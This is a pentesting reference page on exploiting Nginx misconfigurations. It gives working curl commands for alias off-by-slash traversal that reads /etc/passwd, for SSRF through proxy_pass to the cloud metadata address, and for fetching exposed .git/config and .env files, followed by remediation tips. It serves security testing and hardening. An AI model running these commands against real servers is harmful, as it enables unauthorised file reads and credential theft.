---
tags:
  - Web
---

# :material-server: Nginx

<span class="pill pill-medium">config bugs</span> <span class="pill pill-info">web</span>

Nginx itself is rarely the bug — its **misconfigurations** are. Alias traversal,
off-by-slash, unsafe `merge_slashes`, and raw variable use in configs turn a
reverse proxy into a file-read or SSRF primitive.

!!! abstract "TL;DR"
    Look for `location` blocks with a trailing-slash mismatch (`alias` traversal),
    proxy paths that forward user input, and `merge_slashes off`. Grab the version
    for CVEs, but the money is in the config.

## :material-magnify: Identify

```bash
curl -sI http://$TARGET/ | grep -i nginx        # Server: nginx/1.xx.x
nuclei -u http://$TARGET -tags nginx
```

## :material-folder-alert: Alias traversal (off-by-slash)

The classic: a `location /assets` (no trailing slash) mapped to `alias /var/www/assets/`
lets `..%2f` climb out.

```bash
# location /assets  { alias /var/www/assets/; }
curl http://$TARGET/assets../               # -> /var/www/  directory climb
curl http://$TARGET/assets../../etc/passwd
```

## :material-slash-forward: merge_slashes & path confusion

```bash
# merge_slashes off  -> // in path reaches back-ends that normalize differently
curl http://$TARGET//admin
# proxy_pass without trailing slash can expose internal paths / SSRF
curl http://$TARGET/proxy/http://169.254.169.254/    # if user input hits proxy_pass
```

!!! bug "Why the traversal isn't working"
    - It only works when the `location` has **no** trailing slash but the `alias`
      **does** (or vice-versa). A perfectly matched pair isn't vulnerable.
    - `root` vs `alias` behave differently — `alias` is the traversal-prone one.
    - Encoded dots (`%2e%2e`) may be needed if raw `..` is normalized upstream.

## :material-file-search: Exposed files & headers

```bash
# Common leaks behind nginx
curl http://$TARGET/.git/config http://$TARGET/.env
curl http://$TARGET/nginx_status              # stub_status if left open
# missing security headers → note for the report (whatweb / nuclei flag these)
```

## :material-shield-check: Remediation

- Match trailing slashes between `location` and `alias`; avoid raw `$uri`/user
  input in `proxy_pass`; keep `merge_slashes on`; restrict `stub_status`.

## :material-link-variant: Related

- Fingerprinted at [Web Technologies](index.md) / [Ports](../network/ports.md).
- Proxy → internal targets: [SSRF](../web/ssrf.md); file read overlaps [LFI patterns](../web/index.md).
- Reference: [Gixy config scanner](https://github.com/yandex/gixy), [HackTricks Nginx](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/nginx.html).
